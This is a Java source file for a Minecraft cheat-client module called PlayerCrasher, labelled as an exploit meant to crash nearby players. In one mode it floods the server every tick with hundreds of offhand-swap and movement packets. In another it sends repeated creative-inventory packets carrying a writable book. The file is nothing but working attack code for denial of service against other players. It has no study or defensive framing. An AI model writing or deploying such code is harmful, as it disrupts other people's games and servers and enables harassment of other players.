package unlimited.litehacks.mods.exploit;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import org.lwjgl.glfw.GLFW;
import unlimited.litehacks.mods.Module;
import unlimited.litehacks.mods.settings.BooleanSetting;
import unlimited.litehacks.mods.settings.ModeSetting;
import unlimited.litehacks.mods.settings.NumberSetting;

public class PlayerCrasher extends Module {

    ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
    public NumberSetting playerCrashAmount = new NumberSetting("Speed", 0, 20, 1, 0.1);
    public ModeSetting playerCrashType = new ModeSetting("Mode", "Swap", "Packet");

    public PlayerCrasher() {
        super("PlayerCrasher", "Crashes nearby players", Category.EXPLOIT);
        addSettings(playerCrashAmount, playerCrashType);
    }

    @Override
    public void onEnable() {
        assert mc.player != null;

    }

    @Override
    public void onDisable() {
        assert mc.player != null;

        super.onDisable();
    }

    @Override
    public void onTick() {
        if (mc.player != null) {
            if (playerCrashType.isMode("Swap")) {
                for (int i = 0; i < playerCrashAmount.getValueInt() * 20; i++) {
                    mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                }
            }

            if (playerCrashType.isMode("Packet")) {
                for (int i = 0; i < playerCrashAmount.getValueInt(); i++) {
                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
                }
            }
        }
        super.onTick();
    }



}
